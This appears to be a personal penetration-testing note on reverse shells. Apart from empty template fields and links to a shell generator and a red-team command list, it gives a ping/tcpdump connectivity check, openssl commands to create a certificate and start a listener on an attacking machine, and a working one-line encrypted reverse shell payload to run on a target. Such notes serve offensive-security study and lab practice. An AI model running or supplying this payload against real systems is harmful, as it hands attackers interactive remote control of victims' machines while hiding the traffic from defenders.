---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Reverse Shells]]  
___

## Description:  

[Reverse Shell Generator](https://www.revshells.com/)

Test for incoming pings

```
ping -c 3 192.168.49.85

sudo tcpdump -i any  ip proto icmp
```

### Encrypted Reverse Shells with OpenSSL

Generate SSL certificate:

```
openssl req -x509 -quiet -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

Start an SSL listener on your attacking machine using `openssl`:

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

Run the payload on target machine using `openssl`:

```
mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect 127.0.0.1:4444>/tmp/s 2>/dev/null;rm /tmp/s
```

Others: https://github.com/RoseSecurity/Red-Teaming-TTPs/blob/main/Linux.md

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:30 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
